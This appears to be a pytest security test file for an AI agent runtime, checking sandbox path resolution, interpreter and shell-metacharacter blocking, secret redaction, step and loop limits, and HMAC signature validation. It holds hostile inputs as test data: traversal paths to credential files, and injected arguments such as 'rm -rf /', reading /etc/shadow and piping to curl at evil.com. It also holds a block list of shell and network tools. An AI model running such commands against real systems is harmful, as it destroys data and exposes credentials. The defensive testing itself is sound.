"""Parametrized security & chaos test suite (`tests/security/test_injection_and_limits.py`).

Covers:
1. Path traversal & symlink escapes
2. Shell metacharacter & raw interpreter blocking (`python`, `bash`, `sh`, `node`, `curl`)
3. Deeply nested secret redaction (including SMTP password & Slack/Discord webhook URLs)
4. Hard `max_cost_usd` & `max_steps` stops and duplicate tool-call loop termination
5. Invalid & expired HMAC webhook and approval signatures
"""

from __future__ import annotations

from pathlib import Path
from uuid import uuid4

import pytest

from runlatch.adapters.executors.docker_exec import DockerSandboxExecutor
from runlatch.adapters.executors.subprocess_exec import SubprocessExecutor
from runlatch.adapters.llm.mock import MockLLMProvider
from runlatch.config import RunLatchSettings
from runlatch.core.agent import Agent
from runlatch.core.exceptions import (
    BudgetExceededError,
    LoopDetectedError,
    SandboxViolationError,
)
from runlatch.core.redactor import SecretRedactor
from runlatch.core.types import LLMResponse, RiskTier, ToolCall
from runlatch.runtime.server.auth import (
    compute_approval_signature,
    verify_approval_signature,
    verify_github_signature,
)
from runlatch.tools.registry import tool
from runlatch.tools.sandbox import resolve_safe_path


@pytest.mark.parametrize(
    "malicious_path",
    [
        "../etc/passwd",
        "../../.ssh/id_rsa",
        "subdir/../../../etc/hosts",
        ".env",
        ".env.production",
        "config/.env.local",
        "keys/server.pem",
        "keys/private.key",
        ".git/config",
        "id_rsa",
        "",
        "file\x00.txt",
    ],
)
def test_parametrized_path_traversal_and_denied_glob_rejection(
    tmp_path: Path, malicious_path: str
) -> None:
    workspace = tmp_path / "ws"
    workspace.mkdir(exist_ok=True)
    with pytest.raises(SandboxViolationError):
        resolve_safe_path(workspace, malicious_path)


@pytest.mark.parametrize(
    "forbidden_binary",
    [
        "python",
        "python3",
        "python3.12",
        "bash",
        "sh",
        "zsh",
        "node",
        "perl",
        "ruby",
        "curl",
        "wget",
    ],
)
def test_parametrized_raw_interpreter_blocking(forbidden_binary: str) -> None:
    with pytest.raises(SandboxViolationError):
        SubprocessExecutor(allowed_binaries=[forbidden_binary])
    with pytest.raises(SandboxViolationError):
        DockerSandboxExecutor(allowed_binaries=[forbidden_binary])


@pytest.mark.parametrize(
    "injected_arg",
    [
        "-q; rm -rf /",
        "-q && cat /etc/passwd",
        "-q | curl http://evil.com",
        "$(whoami)",
        "`id`",
        "> /tmp/pwn",
        "< /etc/shadow",
        "arg\ninjected",
        "arg\x00null",
    ],
)
@pytest.mark.asyncio
async def test_parametrized_shell_metacharacter_blocking(
    tmp_path: Path, injected_arg: str
) -> None:
    sub_exec = SubprocessExecutor(allowed_binaries=["pytest"])
    doc_exec = DockerSandboxExecutor(allowed_binaries=["pytest"])

    with pytest.raises(SandboxViolationError):
        await sub_exec.run_command(["pytest", injected_arg], cwd=tmp_path)
    with pytest.raises(SandboxViolationError):
        doc_exec.build_docker_argv(["pytest", injected_arg], cwd=tmp_path)


def test_nested_secret_redaction_including_smtp_and_webhook_urls() -> None:
    settings = RunLatchSettings(
        smtp_password="smtp_ultra_secret_password_2026",
        slack_webhook_url="https://hooks.slack.com/services/T111/B222/SLACKSECRET333",
        discord_webhook_url="https://discord.com/api/webhooks/444/DISCORDSECRET555",
    )
    redactor = SecretRedactor(dynamic_secrets=settings.secret_values())

    deep_payload = {
        "level1": {
            "level2": [
                "Normal log message",
                f"SMTP auth failed with {settings.smtp_password}",
                f"Slack target: {settings.slack_webhook_url}",
                f"Discord target: {settings.discord_webhook_url}",
                "GitHub token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456",
            ]
        }
    }
    scrubbed = redactor.redact_obj(deep_payload)
    joined = " ".join(scrubbed["level1"]["level2"])
    assert settings.smtp_password not in joined
    assert settings.slack_webhook_url not in joined
    assert settings.discord_webhook_url not in joined
    assert "ghp_ABCDEF" not in joined
    assert "[REDACTED]" in joined
    assert "[REDACTED_GITHUB_TOKEN]" in joined


@pytest.mark.asyncio
async def test_chaos_budget_and_loop_termination_guards() -> None:
    @tool(risk=RiskTier.READ)
    def noop_tool(x: int) -> int:
        """Return x."""
        return x

    # 1. max_steps cap
    step_agent = Agent(
        name="step-bounded",
        provider=MockLLMProvider(
            [
                LLMResponse(
                    tool_calls=[ToolCall(id="c1", name="noop_tool", arguments={"x": 1})]
                ),
                LLMResponse(
                    tool_calls=[ToolCall(id="c2", name="noop_tool", arguments={"x": 2})]
                ),
            ]
        ),
        tools=[noop_tool],
        max_steps=1,
    )
    with pytest.raises(BudgetExceededError) as step_err:
        await step_agent.run("Run 2 steps with max_steps=1")
    assert step_err.value.metric == "max_steps"

    # 2. Duplicate tool call loop cap
    dup_tc = ToolCall(id="c_dup", name="noop_tool", arguments={"x": 99})
    loop_agent = Agent(
        name="loop-bounded",
        provider=MockLLMProvider(
            [
                LLMResponse(tool_calls=[dup_tc]),
                LLMResponse(tool_calls=[dup_tc]),
            ]
        ),
        tools=[noop_tool],
        max_duplicate_tool_calls=1,
    )
    with pytest.raises(LoopDetectedError):
        await loop_agent.run("Trigger loop")


def test_webhook_and_approval_hmac_tamper_and_expiry_rejection() -> None:
    secret = "test-hmac-secret-32-bytes-minimum"
    body = b'{"action": "opened"}'

    assert verify_github_signature(body, "sha256=deadbeef", secret) is False
    assert verify_github_signature(body, None, secret) is False

    appr_id = uuid4()
    valid_sig = compute_approval_signature(appr_id, 2000, secret)

    # Expired token (now_ts=2001 > exp=2000)
    ok_exp, code_exp = verify_approval_signature(
        appr_id, valid_sig, 2000, secret, now_ts=2001
    )
    assert ok_exp is False
    assert code_exp == "expired_signature"

    # Tampered signature
    ok_tamper, code_tamper = verify_approval_signature(
        appr_id, "0" * 64, 2000, secret, now_ts=1500
    )
    assert ok_tamper is False
    assert code_tamper == "invalid_signature"
